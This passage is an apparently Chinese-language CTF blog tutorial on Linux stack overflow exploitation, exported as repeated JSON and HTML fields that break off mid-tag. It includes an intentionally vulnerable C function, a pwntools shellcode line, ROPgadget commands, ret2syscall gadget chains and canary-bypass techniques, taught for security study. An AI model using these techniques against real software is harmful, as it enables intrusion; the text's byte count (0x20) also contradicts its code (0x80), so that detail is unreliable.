Canary\n\nCanary是针对栈溢出攻击的防护，其防护方式是在push入ebp(或rbp)后push入一个canary，在函数返回时根据canary的值与原来是否一致来判断是否发生栈溢出。但是Canary防护并非无懈可击，只要可以**泄露出canary**，并在栈溢出时在canary的位置用canary的值去覆盖，则不会被检测出发生栈溢出。**值得注意的是，一般情况下，程序每次运行的canary都不相同。**\n\n一、覆盖'\\x00'\n\n通常**字符串均以'\\x00'作为结束符**，因此一旦'\\x00'被覆盖，程序将无法知道字符串正确的结束位置，若此时使用函数进行输出，则会继续输出字符串后面的内容，直到出现'\\x00'。因此如果有一个栈上的字符串和输出函数，通过栈溢出漏洞保证**在canary之前不会出现'\\x00'**，则输出函数会将后续的canary泄露出来。\n\n二、泄露fs:28h\n\n由于在函数结束之后需要对canary的值进行验证，因此程序中一定有一个地方存放着canary的值用于验证。通常在汇编代码中可以找到用来验证的值，这个值是fs:28h，如果任意读则可以从中泄露出canary，在栈溢出时填入canary。\n\nfs:28h与libc基地址的偏移是固定的，通过爆破或其他方法可以得到fs:28h的位置。\n\n三、覆写canary\n\n这个方法也是对canary的验证值fs:28h进行攻击，但是是通过将canary的验证值修改为一个我们知道的值，然后在栈溢出时将canary覆盖为这个值。这个攻击的前提是可以写到fs:28h的位置。\n\n四、逐字节爆破\n\n在部分情况下，程序重启之后的canary值保持不变（常常是在BROP的题目中），这时候就可以采用逐字节爆破的方法去得到canary。\n\n从低字节开始逐个字节进行爆破，当一个字节爆破成功时，程序不会异常关闭，此时就可以知道这一个字节的值，可以继续爆破下一个字节；反之，程序会异常关闭，这样就知道这次尝试是错的。\n\n五、stack smashing\n\n有时候我们可能无法绕过canary保护，但利用canary保护，我们也可以泄露一些信息。\n\nstack smashing是一种利用canary保护泄露信息的攻击。在程序检测到canary被修改时，程序不会继续返回，而是调用函数__stack_chk_fail打印错误信息。如：\\*\\*\\* stack smashing detected \\*\\*\\*: ./pwn terminated\n\n可以看到__stack_chk_fail打印的错误信息中就包含程序的名字（pwn）。其实__stack_chk_fail会打印**argv[0]这个指针所指向的字符串**，一般来说这个字符串是程序的名字。而**argv[0]一般存放在栈上**，通过**栈溢出覆盖argv[0]**即可泄露出其他信息（即使程序知道canary被修改了，栈溢出覆盖的数据**依旧会被覆盖**）。","source":"_posts/stack_overflow.md","raw":"---\ntitle: 栈溢出\ndate: 2023-01-02 00:00:10\ncategories: \n- pwn\ntags: \n- pwn\n- stackoverflow\n---\n栈溢出是pwn的开始，是pwn中最基础的部分。不同系统的栈溢出利用会有所不同，但主要的思路都是一样的，下面主要记录的是linux下的栈溢出。\n<!--more-->\n\n## 函数调用栈\n\n函数调用的过程是通过**栈**实现的，这个栈就是函数调用栈。\n\n栈是一种先进后出（LIFO）的数据结构，有压栈(push)和出栈(pop)两种操作，函数调用栈中存放有函数调用信息和局部变量。\n其中函数调用信息包括**函数的返回地址**、**ebp(或rbp)的保存值**、**函数的参数**。\n\n不同位数对函数调用栈的利用有所不同：\n\n- intel_x86(32位)：函数的参数全部保存在栈中\n\n- intel_x64(64位)：函数的前六个整型或指针参数依次保存在寄存器rdi,rsi,rdx,rcx,r8,r9中，如果寄存器不够用才会保存在栈上\n\n函数的参数会在函数调用前（执行call指令之前）**逆序**入栈\n\n![stack](./stack_overflow/stack.png)\n\n函数调用栈从**高地址向低地址生长**，也就是说高地址处为栈底。\n\n在函数调用时，程序会执行call指令调用函数\n\n```\ncall function_name  //调用函数\n等价于下面两条指令\npush ret_addr   //将函数返回地址（即函数执行完后执行的下一条指令的地址）push入栈\njump function_name  //跳转到调用函数的具体代码\n```\n\n在跳转到调用函数的具体代码后，会首先执行以下指令：\n\n```\n如果是64位则是rsp和rbp\npush ebp    //将当前的ebp保存在栈上\nmov esp , ebp   //将ebp的值赋值给esp,让他们指向同一处\nsub esp , xh    //让esp的值减去x，为该函数的局部变量预留栈空间（此处的h表示x为16进制数）\n```\n\n在函数结束时，程序会执行leave和ret指令退出函数\n\n```\n如果是64位则是rsp、rbp和rip\nleave\n相当于下面两条指令\nmov esp , ebp  //将ebp的值赋值给esp,让他们指向同一处\npop ebp    //将之前保存的ebp pop出栈\n\nret\n相当于pop eip   //将之前保存的返回地址ret_addr pop到eip,eip寄存器中存放的是下一条要执行的指令的地址\n```\n\n## 栈溢出原理\n\n在程序执行的过程中，**栈中变量**写入的字节数**超出**了这个变量申请的字节数，导致**写入内容覆盖了栈中后续的变量**。栈溢出漏洞轻则使程序崩溃，重则使程序的执行流被控制。\n\n栈溢出漏洞是比较好发现的，只需要寻找**向栈上写入数据的函数**，并检查其**写入数据的字节数**是否合法即可。\n\n如下列的程序片段：\n\n```c\nvoid vuln()\n{\n    char buf[0x10];\n    read(0,buf,0x80);\n    //gets(buf);\n    //scanf(\"%s\",buf);\n    return;\n}\n\nint main()\n{\n    vuln();\n    return 0;\n}\n```\n\n在上面的vuln()函数中，**局部变量buf存储在栈上**，其申请的内存只有0x10字节，但在read()函数中却向buf中写入0x20字节，**超出了buf申请的范围**，除此之外，gets()函数和scanf()函数向buf中写入，但却没有检查写入的字节数目，因此也有栈溢出漏洞。\n\n栈溢出漏洞通常利用超出范围的写入**修改栈上的其他变量**，可以通过**修改栈上的变量改变程序的执行流程**，也可以通过**修改变量后保存在栈上的ebp和返回地址值改变程序的执行流程**。\n\n上述程序片段的栈空间如下：\n![stack](./stack_overflow/stack2.png)\n\n通过栈溢出可以覆盖vuln()函数的ebp和返回地址。\n\n## ret2txt\n\nret2txt是对程序原有代码片段的利用，通过栈溢出**将该函数的返回地址覆盖为程序原有的代码片段的地址**（如后门函数的地址），从而get shell。\n\n## ret2shellcode\n\n大部分程序都没有后门函数，因此ret2txt在许多场合下都是行不通的。因此需要我们自行写入一段能get shell的代码，这段代码就是shellcode。通过栈溢出**将该函数的返回地址覆盖为shellcode**即可get shell。\n\npwntools中可以很方便的得到shellcode。\n\n```python\nfrom pwn import*\ncontext.arch='...'  #设置系统的架构，如amd64，i386...\n\nshellcode = asm(shellcraft.sh())\n```\n\n然而ret2shellcode会受到**NX保护**的防护，在开启NX保护后，写入的shellcode所在的内存页不可执行，因此无法运行shellcode得到shell。\n\n## ret2syscall\n\nret2syscall通过系统调用execve()执行execve(\"/bin/sh\",NULL,NULL)进行get shell。\n\n执行系统调用execve(\"/bin/sh\",NULL,NULL)仅需要将需要的参数传到**寄存器**，之后控制程序执行**int 0x80(32位)**或**syscall(64位)**。\n\n对于**32位**而言，需要将**系统调用号**传到**eax**寄存器，execve()的系统调用号为**11**；**第一个参数\"/bin/sh\"的地址**传到**ebx**寄存器；**第二、第三个**参数0传到**ecx,edx**寄存器。\n\n对于**64位**而言，需要将**系统调用号**传到**rax**寄存器，execve()的系统调用号为**59**；**第一个参数\"/bin/sh\"的地址**传到**rdi**寄存器；**第二、第三个**参数0传到**rsi,rdx**寄存器。\n\n如果有其他需要，也可以通过改变传入的系统调用号和参数执行其他的系统调用（如read、write、sigreturn）。\n\n要达到传参和调用syscall的目的，我们可以利用进一步**利用程序中更小的代码片段**（以后称为**gadget**）。\n\n通过ROPgadget可以找到程序中可以利用的gadget，\n```\nROPgadget --binary 二进制文件名 --only 关键词(如pop、ret、eax、ebx...，关键词中可用|表示或) 可用于查找对应的gadget的地址\nROPgadget --binary 二进制文件名 --string 字符串 可用于查找对应字符串的地址\n\n后面可以接grep命令通过表达式缩小查找范围，除此之外ROPgadget还有其他用处。\n```\n\n通常找到的gadget大概是这样的：（如果能找到的话）\n```\n0x080480c9:pop rbx; ret\n0x0804808a:pop rbx; pop rdi; pop rsi; ret\n...\n\n0x08049421:int 0x80;\n...\n\n0x080be408:\"/bin/sh\"\n```\n\n通过在栈上布置pop指令，并在栈的后面布置要pop的参数，将该参数pop到对应寄存器中，由于通常选择**后续紧跟ret**的gadget，因此在执行了一个gadget后会ret，方便我们继续劫持栈。\n\n对于寄存器**eax(rax)**，还有其他的方式可以控制其值。一般来说，函数的**返回值**都会存放在寄存器eax(rax)中，据此可以通过函数返回值控制其值。如**read()函数会返回其读入数据的长度**，因此可以通过read()函数读入数据的长度来控制eax(rax)的值。\n\n## Canary\n\nCanary是针对栈溢出攻击的防护，其防护方式是在push入ebp(或rbp)后push入一个canary，在函数返回时根据canary的值与原来是否一致来判断是否发生栈溢出。但是Canary防护并非无懈可击，只要可以**泄露出canary**，并在栈溢出时在canary的位置用canary的值去覆盖，则不会被检测出发生栈溢出。**值得注意的是，一般情况下，程序每次运行的canary都不相同。**\n\n一、覆盖'\\x00'\n\n通常**字符串均以'\\x00'作为结束符**，因此一旦'\\x00'被覆盖，程序将无法知道字符串正确的结束位置，若此时使用函数进行输出，则会继续输出字符串后面的内容，直到出现'\\x00'。因此如果有一个栈上的字符串和输出函数，通过栈溢出漏洞保证**在canary之前不会出现'\\x00'**，则输出函数会将后续的canary泄露出来。\n\n二、泄露fs:28h\n\n由于在函数结束之后需要对canary的值进行验证，因此程序中一定有一个地方存放着canary的值用于验证。通常在汇编代码中可以找到用来验证的值，这个值是fs:28h，如果任意读则可以从中泄露出canary，在栈溢出时填入canary。\n\nfs:28h与libc基地址的偏移是固定的，通过爆破或其他方法可以得到fs:28h的位置。\n\n三、覆写canary\n\n这个方法也是对canary的验证值fs:28h进行攻击，但是是通过将canary的验证值修改为一个我们知道的值，然后在栈溢出时将canary覆盖为这个值。这个攻击的前提是可以写到fs:28h的位置。\n\n四、逐字节爆破\n\n在部分情况下，程序重启之后的canary值保持不变（常常是在BROP的题目中），这时候就可以采用逐字节爆破的方法去得到canary。\n\n从低字节开始逐个字节进行爆破，当一个字节爆破成功时，程序不会异常关闭，此时就可以知道这一个字节的值，可以继续爆破下一个字节；反之，程序会异常关闭，这样就知道这次尝试是错的。\n\n五、stack smashing\n\n有时候我们可能无法绕过canary保护，但利用canary保护，我们也可以泄露一些信息。\n\nstack smashing是一种利用canary保护泄露信息的攻击。在程序检测到canary被修改时，程序不会继续返回，而是调用函数__stack_chk_fail打印错误信息。如：\\*\\*\\* stack smashing detected \\*\\*\\*: ./pwn terminated\n\n可以看到__stack_chk_fail打印的错误信息中就包含程序的名字（pwn）。其实__stack_chk_fail会打印**argv[0]这个指针所指向的字符串**，一般来说这个字符串是程序的名字。而**argv[0]一般存放在栈上**，通过**栈溢出覆盖argv[0]**即可泄露出其他信息（即使程序知道canary被修改了，栈溢出覆盖的数据**依旧会被覆盖**）。","slug":"stack_overflow","published":1,"updated":"2023-01-03T14:59:20.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagm006a5oudhoym95iu","content":"<p>栈溢出是pwn的开始，是pwn中最基础的部分。不同系统的栈溢出利用会有所不同，但主要的思路都是一样的，下面主要记录的是linux下的栈溢出。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"函数调用栈\"><a href=\"#函数调用栈\" class=\"headerlink\" title=\"函数调用栈\"></a>函数调用栈</h2><p>函数调用的过程是通过<strong>栈</strong>实现的，这个栈就是函数调用栈。</p>\n<p>栈是一种先进后出（LIFO）的数据结构，有压栈(push)和出栈(pop)两种操作，函数调用栈中存放有函数调用信息和局部变量。<br>其中函数调用信息包括<strong>函数的返回地址</strong>、<strong>ebp(或rbp)的保存值</strong>、<strong>函数的参数</strong>。</p>\n<p>不同位数对函数调用栈的利用有所不同：</p>\n<ul>\n<li><p>intel_x86(32位)：函数的参数全部保存在栈中</p>\n</li>\n<li><p>intel_x64(64位)：函数的前六个整型或指针参数依次保存在寄存器rdi,rsi,rdx,rcx,r8,r9中，如果寄存器不够用才会保存在栈上</p>\n</li>\n</ul>\n<p>函数的参数会在函数调用前（执行call指令之前）<strong>逆序</strong>入栈</p>\n<p><img src=\"./stack_overflow/stack.png\" alt=\"stack\"></p>\n<p>函数调用栈从<strong>高地址向低地址生长</strong>，也就是说高地址处为栈底。</p>\n<p>在函数调用时，程序会执行call指令调用函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call function_name  //调用函数</span><br><span class=\"line\">等价于下面两条指令</span><br><span class=\"line\">push ret_addr   //将函数返回地址（即函数执行完后执行的下一条指令的地址）push入栈</span><br><span class=\"line\">jump function_name  //跳转到调用函数的具体代码</span><br></pre></td></tr></table></figure>\n\n<p>在跳转到调用函数的具体代码后，会首先执行以下指令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果是64位则是rsp和rbp</span><br><span class=\"line\">push ebp    //将当前的ebp保存在栈上</span><br><span class=\"line\">mov esp , ebp   //将ebp的值赋值给esp,让他们指向同一处</span><br><span class=\"line\">sub esp , xh    //让esp的值减去x，为该函数的局部变量预留栈空间（此处的h表示x为16进制数）</span><br></pre></td></tr></table></figure>\n\n<p>在函数结束时，程序会执行leave和ret指令退出函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果是64位则是rsp、rbp和rip</span><br><span class=\"line\">leave</span><br><span class=\"line\">相当于下面两条指令</span><br><span class=\"line\">mov esp , ebp  //将ebp的值赋值给esp,让他们指向同一处</span><br><span class=\"line\">pop ebp    //将之前保存的ebp pop出栈</span><br><span class=\"line\"></span><br><span class=\"line\">ret</span><br><span class=\"line\">相当于pop eip   //将之前保存的返回地址ret_addr pop到eip,eip寄存器中存放的是下一条要执行的指令的地址</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"栈溢出原理\"><a href=\"#栈溢出原理\" class=\"headerlink\" title=\"栈溢出原理\"></a>栈溢出原理</h2><p>在程序执行的过程中，<strong>栈中变量</strong>写入的字节数<strong>超出</strong>了这个变量申请的字节数，导致<strong>写入内容覆盖了栈中后续的变量</strong>。栈溢出漏洞轻则使程序崩溃，重则使程序的执行流被控制。</p>\n<p>栈溢出漏洞是比较好发现的，只需要寻找<strong>向栈上写入数据的函数</strong>，并检查其<strong>写入数据的字节数</strong>是否合法即可。</p>\n<p>如下列的程序片段：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x10</span>];</span><br><span class=\"line\">    read(<span class=\"number\">0</span>,buf,<span class=\"number\">0x80</span>);</span><br><span class=\"line\">    <span class=\"comment\">//gets(buf);</span></span><br><span class=\"line\">    <span class=\"comment\">//scanf(&quot;%s&quot;,buf);</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    vuln();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在上面的vuln()函数中，<strong>局部变量buf存储在栈上</strong>，其申请的内存只有0x10字节，但在read()函数中却向buf中写入0x20字节，<strong>超出了buf申请的范围</strong>，除此之外，gets()函数和scanf()函数向buf中写入，但却没有检查写入的字节数目，因此也有栈溢出漏洞。</p>\n<p>栈溢出漏洞通常利用超出范围的写入<strong>修改栈上的其他变量</strong>，可以通过<strong>修改栈上的变量改变程序的执行流程</strong>，也可以通过<strong>修改变量后保存在栈上的ebp和返回地址值改变程序的执行流程</strong>。</p>\n<p>上述程序片段的栈空间如下：<br><img src=\"./stack_overflow/stack2.png\" alt=\"stack\"></p>\n<p>通过栈溢出可以覆盖vuln()函数的ebp和返回地址。</p>\n<h2 id=\"ret2txt\"><a href=\"#ret2txt\" class=\"headerlink\" title=\"ret2txt\"></a>ret2txt</h2><p>ret2txt是对程序原有代码片段的利用，通过栈溢出<strong>将该函数的返回地址覆盖为程序原有的代码片段的地址</strong>（如后门函数的地址），从而get shell。</p>\n<h2 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a>ret2shellcode</h2><p>大部分程序都没有后门函数，因此ret2txt在许多场合下都是行不通的。因此需要我们自行写入一段能get shell的代码，这段代码就是shellcode。通过栈溢出<strong>将该函数的返回地址覆盖为shellcode</strong>即可get shell。</p>\n<p>pwntools中可以很方便的得到shellcode。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;...&#x27;</span>  <span class=\"comment\">#设置系统的架构，如amd64，i386...</span></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>\n\n<p>然而ret2shellcode会受到<strong>NX保护</strong>的防护，在开启NX保护后，写入的shellcode所在的内存页不可执行，因此无法运行shellcode得到shell。</p>\n<h2 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a>ret2syscall</h2><p>ret2syscall通过系统调用execve()执行execve(“/bin/sh”,NULL,NULL)进行get shell。</p>\n<p>执行系统调用execve(“/bin/sh”,NULL,NULL)仅需要将需要的参数传到<strong>寄存器</strong>，之后控制程序执行**int 0x80(32位)<strong>或</strong>syscall(64位)**。</p>\n<p>对于<strong>32位</strong>而言，需要将<strong>系统调用号</strong>传到<strong>eax</strong>寄存器，execve()的系统调用号为<strong>11</strong>；<strong>第一个参数”/bin/sh”的地址</strong>传到<strong>ebx</strong>寄存器；<strong>第二、第三个</strong>参数0传到<strong>ecx,edx</strong>寄存器。</p>\n<p>对于<strong>64位</strong>而言，需要将<strong>系统调用号</strong>传到<strong>rax</strong>寄存器，execve()的系统调用号为<strong>59</strong>；<strong>第一个参数”/bin/sh”的地址</strong>传到<strong>rdi</strong>寄存器；<strong>第二、第三个</strong>参数0传到<strong>rsi,rdx</strong>寄存器。</p>\n<p>如果有其他需要，也可以通过改变传入的系统调用号和参数执行其他的系统调用（如read、write、sigreturn）。</p>\n<p>要达到传参和调用syscall的目的，我们可以利用进一步<strong>利用程序中更小的代码片段</strong>（以后称为<strong>gadget</strong>）。</p>\n<p>通过ROPgadget可以找到程序中可以利用的gadget，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary 二进制文件名 --only 关键词(如pop、ret、eax、ebx...，关键词中可用|表示或) 可用于查找对应的gadget的地址</span><br><span class=\"line\">ROPgadget --binary 二进制文件名 --string 字符串 可用于查找对应字符串的地址</span><br><span class=\"line\"></span><br><span class=\"line\">后面可以接grep命令通过表达式缩小查找范围，除此之外ROPgadget还有其他用处。</span><br></pre></td></tr></table></figure>\n\n<p>通常找到的gadget大概是这样的：（如果能找到的话）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x080480c9:pop rbx; ret</span><br><span class=\"line\">0x0804808a:pop rbx; pop rdi; pop rsi; ret</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">0x08049421:int 0x80;</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">0x080be408:&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>\n\n<p>通过在栈上布置pop指令，并在栈的后面布置要pop的参数，将该参数pop到对应寄存器中，由于通常选择<strong>后续紧跟ret</strong>的gadget，因此在执行了一个gadget后会ret，方便我们继续劫持栈。</p>\n<p>对于寄存器<strong>eax(rax)<strong>，还有其他的方式可以控制其值。一般来说，函数的</strong>返回值</strong>都会存放在寄存器eax(rax)中，据此可以通过函数返回值控制其值。如<strong>read()函数会返回其读入数据的长度</strong>，因此可以通过read()函数读入数据的长度来控制eax(rax)的值。</p>\n<h2 id=\"Canary\"><a href=\"#Canary\" class=\"headerlink\" title=\"Canary\"></a>Canary</h2><p>Canary是针对栈溢出攻击的防护，其防护方式是在push入ebp(或rbp)后push入一个canary，在函数返回时根据canary的值与原来是否一致来判断是否发生栈溢出。但是Canary防护并非无懈可击，只要可以<strong>泄露出canary</strong>，并在栈溢出时在canary的位置用canary的值去覆盖，则不会被检测出发生栈溢出。<strong>值得注意的是，一般情况下，程序每次运行的canary都不相同。</strong></p>\n<p>一、覆盖’\\x00’</p>\n<p>通常<strong>字符串均以’\\x00’作为结束符</strong>，因此一旦’\\x00’被覆盖，程序将无法知道字符串正确的结束位置，若此时使用函数进行输出，则会继续输出字符串后面的内容，直到出现’\\x00’。因此如果有一个栈上的字符串和输出函数，通过栈溢出漏洞保证**在canary之前不会出现’\\x00’**，则输出函数会将后续的canary泄露出来。</p>\n<p>二、泄露fs:28h</p>\n<p>由于在函数结束之后需要对canary的值进行验证，因此程序中一定有一个地方存放着canary的值用于验证。通常在汇编代码中可以找到用来验证的值，这个值是fs:28h，如果任意读则可以从中泄露出canary，在栈溢出时填入canary。</p>\n<p>fs:28h与libc基地址的偏移是固定的，通过爆破或其他方法可以得到fs:28h的位置。</p>\n<p>三、覆写canary</p>\n<p>这个方法也是对canary的验证值fs:28h进行攻击，但是是通过将canary的验证值修改为一个我们知道的值，然后在栈溢出时将canary覆盖为这个值。这个攻击的前提是可以写到fs:28h的位置。</p>\n<p>四、逐字节爆破</p>\n<p>在部分情况下，程序重启之后的canary值保持不变（常常是在BROP的题目中），这时候就可以采用逐字节爆破的方法去得到canary。</p>\n<p>从低字节开始逐个字节进行爆破，当一个字节爆破成功时，程序不会异常关闭，此时就可以知道这一个字节的值，可以继续爆破下一个字节；反之，程序会异常关闭，这样就知道这次尝试是错的。</p>\n<p>五、stack smashing</p>\n<p>有时候我们可能无法绕过canary保护，但利用canary保护，我们也可以泄露一些信息。</p>\n<p>stack smashing是一种利用canary保护泄露信息的攻击。在程序检测到canary被修改时，程序不会继续返回，而是调用函数__stack_chk_fail打印错误信息。如：*** stack smashing detected ***: ./pwn terminated</p>\n<p>可以看到__stack_chk_fail打印的错误信息中就包含程序的名字（pwn）。其实__stack_chk_fail会打印<strong>argv[0]这个指针所指向的字符串</strong>，一般来说这个字符串是程序的名字。而<strong>argv[0]一般存放在栈上</strong>，通过<strong>栈溢出覆盖argv[0]<strong>即可泄露出其他信息（即使程序知道canary被修改了，栈溢出覆盖的数据</strong>依旧会被覆盖</strong>）。</p>\n","site":{"data":{}},"excerpt":"<p>栈溢出是pwn的开始，是pwn中最基础的部分。不同系统的栈溢出利用会有所不同，但主要的思路都是一样的，下面主要记录的是linux下的栈溢出。</p>","more":"<h2 id=\"函数调用栈\"><a href=\"#函数调用栈\" class=\"headerlink\" title=\"函数调用栈\"></a>函数调用栈</h2><p>函数调用的过程是通过<strong>栈</strong>实现的，这个栈就是函数调用栈。</p>\n<p>栈是一种先进后出（LIFO）的数据结构，有压栈(push)和出栈(pop)两种操作，函数调用栈中存放有函数调用信息和局部变量。<br>其中函数调用信息包括<strong>函数的返回地址</strong>、<strong>ebp(或rbp)的保存值</strong>、<strong>函数的参数</strong>。</p>\n<p>不同位数对函数调用栈的利用有所不同：</p>\n<ul>\n<li><p>intel_x86(32位)：函数的参数全部保存在栈中</p>\n</li>\n<li><p>intel_x64(64位)：函数的前六个整型或指针参数依次保存在寄存器rdi,rsi,rdx,rcx,r8,r9中，如果寄存器不够用才会保存在栈上</p>\n</li>\n</ul>\n<p>函数的参数会在函数调用前（执行call指令之前）<strong>逆序</strong>入栈</p>\n<p><img src=\"./stack_overflow/stack.png\" alt=\"stack\"></p>\n<p>函数调用栈从<strong>高地址向低地址生长</strong>，也就是说高地址处为栈底。</p>\n<p>在函数调用时，程序会执行call指令调用函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call function_name  //调用函数</span><br><span class=\"line\">等价于下面两条指令</span><br><span class=\"line\">push ret_addr   //将函数返回地址（即函数执行完后执行的下一条指令的地址）push入栈</span><br><span class=\"line\">jump function_name  //跳转到调用函数的具体代码</span><br></pre></td></tr></table></figure>\n\n<p>在跳转到调用函数的具体代码后，会首先执行以下指令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果是64位则是rsp和rbp</span><br><span class=\"line\">push ebp    //将当前的ebp保存在栈上</span><br><span class=\"line\">mov esp , ebp   //将ebp的值赋值给esp,让他们指向同一处</span><br><span class=\"line\">sub esp , xh    //让esp的值减去x，为该函数的局部变量预留栈空间（此处的h表示x为16进制数）</span><br></pre></td></tr></table></figure>\n\n<p>在函数结束时，程序会执行leave和ret指令退出函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果是64位则是rsp、rbp和rip</span><br><span class=\"line\">leave</span><br><span class=\"line\">相当于下面两条指令</span><br><span class=\"line\">mov esp , ebp  //将ebp的值赋值给esp,让他们指向同一处</span><br><span class=\"line\">pop ebp    //将之前保存的ebp pop出栈</span><br><span class=\"line\"></span><br><span class=\"line\">ret</span><br><span class=\"line\">相当于pop eip   //将之前保存的返回地址ret_addr pop到eip,eip寄存器中存放的是下一条要执行的指令的地址</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"栈溢出原理\"><a href=\"#栈溢出原理\" class=\"headerlink\" title=\"栈溢出原理\"></a>栈溢出原理</h2><p>在程序执行的过程中，<strong>栈中变量</strong>写入的字节数<strong>超出</strong>了这个变量申请的字节数，导致<strong>写入内容覆盖了栈中后续的变量</strong>。栈溢出漏洞轻则使程序崩溃，重则使程序的执行流被控制。</p>\n<p>栈溢出漏洞是比较好发现的，只需要寻找<strong>向栈上写入数据的函数</strong>，并检查其<strong>写入数据的字节数</strong>是否合法即可。</p>\n<p>如下列的程序片段：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x10</span>];</span><br><span class=\"line\">    read(<span class=\"number\">0</span>,buf,<span class=\"number\">0x80</span>);</span><br><span class=\"line\">    <span class=\"comment\">//gets(buf);</span></span><br><span class=\"line\">    <span class=\"comment\">//scanf(&quot;%s&quot;,buf);</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    vuln();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在上面的vuln()函数中，<strong>局部变量buf存储在栈上</strong>，其申请的内存只有0x10字节，但在read()函数中却向buf中写入0x20字节，<strong>超出了buf申请的范围</strong>，除此之外，gets()函数和scanf()函数向buf中写入，但却没有检查写入的字节数目，因此也有栈溢出漏洞。</p>\n<p>栈溢出漏洞通常利用超出范围的写入<strong>修改栈上的其他变量</strong>，可以通过<strong>修改栈上的变量改变程序的执行流程</strong>，也可以通过<strong>修改变量后保存在栈上的ebp和返回地址值改变程序的执行流程</strong>。</p>\n<p>上述程序片段的栈空间如下：<br><img 